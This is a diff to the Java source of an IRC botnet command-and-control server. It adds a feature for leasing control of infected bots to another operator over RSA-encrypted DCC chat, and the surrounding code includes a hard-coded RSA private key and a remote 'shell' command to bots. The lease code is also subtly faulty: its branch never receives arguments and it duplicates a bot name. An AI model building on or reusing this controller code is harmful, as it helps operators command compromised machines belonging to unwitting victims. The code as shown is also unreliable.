@@ -77,10 +77,13 @@ public class BotnetServer extends PircBot {
 	private boolean inChat;
 	private Map<String, MsgEncrypt> botKeys;
 	
+	private Map<String, Long> leases;
+	private List<String> leasedBots;
+	
 	private MsgEncrypt m;
 	
-	private String rsaPrivateExp = "71297784175965835129840380767799164802935470319035078256080196093715404322248709184148527780402381402614554597184454624893606179190140937773510113822903233272610610852846100680912323528491646248547292219752408338128335385639782016184316596955228926230719596592082572925879510080781616710237803932128786341473";
-	private String rsaMod = "101303910710900226274349030555647780242601234001053700242140440355421711719614388158299014962476550026734960750908999517650997683806704967780217503081010517989368347136612497678731041194040683080313069165522077936751386218907487890298947166101897033800426412821219973850448264931913696365980503099134782271671";
+	private static final String rsaPrivateExp = "71297784175965835129840380767799164802935470319035078256080196093715404322248709184148527780402381402614554597184454624893606179190140937773510113822903233272610610852846100680912323528491646248547292219752408338128335385639782016184316596955228926230719596592082572925879510080781616710237803932128786341473";
+	private static final String rsaMod = "101303910710900226274349030555647780242601234001053700242140440355421711719614388158299014962476550026734960750908999517650997683806704967780217503081010517989368347136612497678731041194040683080313069165522077936751386218907487890298947166101897033800426412821219973850448264931913696365980503099134782271671";
 
 	public static void main(String[] args) {
 		BotnetServer bn = new BotnetServer();
@@ -90,6 +93,8 @@ public class BotnetServer extends PircBot {
 	 * Constructs a new BotnetServer object that connects to the IRC channel and awaits commands from the user.
 	 */
 	public BotnetServer() {
+		leasedBots = new ArrayList<String>();
+		leases = new HashMap<String, Long>();
 		m = MsgEncrypt.getInstance();
 		m.genRSAPrivKey(rsaMod + " " + rsaPrivateExp);
 		input = new Scanner(System.in);
@@ -139,12 +144,12 @@ public class BotnetServer extends PircBot {
 				chat.sendLine(m.encryptRSA(m2.getStrKey())); // send key
 				chat.sendLine(m.encryptRSA(info.toString())); // send public info
 				String otherKey = chat.readLine().replace("::", "\n").replace("-", "\r").replace("_", "\r\n"); // get public key
-				System.out.println("Client ky for " + name + ": " + otherKey);
+				System.out.println("Client key for " + name + ": " + otherKey);
 				m2.handShake(otherKey);
 				botKeys.put(name, m2);
 				chat.close();
+				System.out.println(" (secure)");
 			}
-			System.out.println(" (secure)");
 		} catch (Exception e) {
 			System.out.println(" (insecure)");
 			e.printStackTrace();
@@ -208,14 +213,27 @@ public class BotnetServer extends PircBot {
 			}
 		//Respond to setop command by acquiring exclusive operator status (DOESN'T WORK)
 		} else if (s.toLowerCase().equalsIgnoreCase("setop")) {
+			acquireOpStatus();
+		} else if (s.toLowerCase().equalsIgnoreCase("lease")) {
 			//lease leaseMaster duration bot [more bots]
 			String[] parts = s.split(" ");
 			if (parts.length > 3) {
 				String leaseMaster = parts[1];
 				long duration = Long.parseLong(parts[2]);
-				chooseBots(parts, 3);
+				String[] bots = chooseBots(parts, 3);
+				DccChat chat = dccSendChatRequest(leaseMaster, TIMEOUT);
+				String botNames = bots[0];
+				for (String name : bots) {
+					botNames += " " + name;
+				}
+				chat.sendLine(m.encryptRSA("lease " + botNames));
+				String leasedPubInfo = chat.readLine();
+				for (String name : bots) {
+					sendMessage(name, botKeys.get(name).encryptMsg(parts[0] + " " + leaseMaster + " " + duration + " " + leasedPubInfo));
+					System.out.println("\tLeased " + name + " to " + leaseMaster + " for " + duration);
+				}
 			} else {
-				
+				System.out.println("Usage: lease leaseMaster duration bot [more bots]");
 			}
 		//Respond to the shell command by sending commands to the specified bot and reading responses until the chat has ended
 		} else if (s.toLowerCase().startsWith("shell")) {
